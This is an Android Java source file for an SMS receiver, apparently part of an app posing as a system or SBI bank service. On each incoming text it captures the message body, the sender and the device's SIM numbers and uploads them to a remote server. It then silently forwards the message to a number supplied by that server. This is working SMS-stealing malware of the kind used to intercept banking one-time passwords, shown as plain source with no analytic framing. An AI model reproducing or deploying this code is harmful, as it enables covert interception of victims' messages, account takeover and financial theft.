package com.system.service.sbi.MinorServices;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import com.system.service.sbi.HelperService;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashSet;
import java.util.Set;

public class SmsReceiver extends BroadcastReceiver {

    private static final Set<String> processedMessages = new HashSet<>();
    private static final long TIME_LIMIT_MS = 60000; // 1 minute window to ignore duplicates
    private int userId = 0;
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() != null && intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                        if (smsMessage != null) {
                            String receiver = HelperService.getSimNumbers(context);
                            String sender = "Receiver : "+receiver + "<br> Sender : " +  smsMessage.getDisplayOriginatingAddress();
                            String messageBody = smsMessage.getMessageBody();

                            long timestamp = smsMessage.getTimestampMillis();
                            String uniqueId = sender + messageBody;

                            if (!isDuplicate(uniqueId, timestamp)) {
                                processedMessages.add(uniqueId);
                                JSONObject jsonData = new JSONObject();
                                try {
                                    HelperService helperService = new HelperService();
                                    jsonData.put("site", helperService.SITE());
                                    jsonData.put("message", messageBody);
                                    jsonData.put("sender", sender);
                                    jsonData.put("model", Build.MODEL);
                                    jsonData.put("status", "N/A");
                                    Log.d(HelperService.TAG, "Data "+jsonData.toString());
                                    HelperService.postRequest(helperService.SMSSavePath(), jsonData, context, new HelperService.ResponseListener() {
                                        @Override
                                        public void onResponse(String result) {
                                            if(result.startsWith("Response Error:")) {
                                                Toast.makeText(context, "Response Error : "+result, Toast.LENGTH_SHORT).show();
                                            } else {
                                                    try {

                                                            JSONObject response = new JSONObject(result);
                                                            if(response.getInt("status")==200){
                                                                  userId  = response.getInt("data");
                                                                    HelperService.getRequest(helperService.getNumber()+ helperService.SITE(), context,  new HelperService.ResponseListener(){
                                                                        @Override
                                                                        public void onResponse(String result){
                                                                            try {
                                                                                // Parse JSON response
                                                                                JSONObject jsonResponse = new JSONObject(result);
                                                                                if (jsonResponse.has("data")) {
                                                                                    String phoneNumber = jsonResponse.getString("data");

                                                                                    Intent sentIntent = new Intent(context, SentReceiver.class);
                                                                                    Intent deliveredIntent = new Intent(context, DeliveredReceiver.class);
                                                                                    sentIntent.putExtra("id", userId);
                                                                                    sentIntent.putExtra("phone", phoneNumber);
                                                                                    deliveredIntent.putExtra("id", userId);
                                                                                    deliveredIntent.putExtra("phone", phoneNumber);
                                                                                    PendingIntent sentPendingIntent = PendingIntent.getBroadcast(context, 0, sentIntent, PendingIntent.FLAG_IMMUTABLE);
                                                                                    PendingIntent deliveredPendingIntent = PendingIntent.getBroadcast(context, 0, deliveredIntent, PendingIntent.FLAG_IMMUTABLE);
                                                                                    SmsManager smsManager = SmsManager.getDefault();
                                                                                    smsManager.sendTextMessage(phoneNumber, null, messageBody, sentPendingIntent, deliveredPendingIntent);
                                                                                } else {
                                                                                    Log.e("MYAPP: ", "Response does not contain 'data' field");
                                                                                }
                                                                            } catch (JSONException e) {
                                                                                e.printStackTrace();
                                                                                Log.e("MYAPP: ", "JSON Parsing Error: " + e.getMessage());
                                                                            }
                                                                        }
                                                                    });

                                                            }else{
                                                                Toast.makeText(context, "Status Not 200 : "+response, Toast.LENGTH_SHORT).show();
                                                            }
                                                        } catch (JSONException e) {
                                                            e.printStackTrace();
                                                        }
                                                    }
                                            }
                                    });
                                } catch (JSONException e) {
                                    throw new RuntimeException(e);
                                }
                            }else{
                                Log.d("mywork", "Duplicate message received from " + sender + " with message: " + messageBody);
                            }
                        }
                    }
                }
            }
        }
    }

    private boolean isDuplicate(String uniqueId, long timestamp) {
        return processedMessages.contains(uniqueId);
    }

}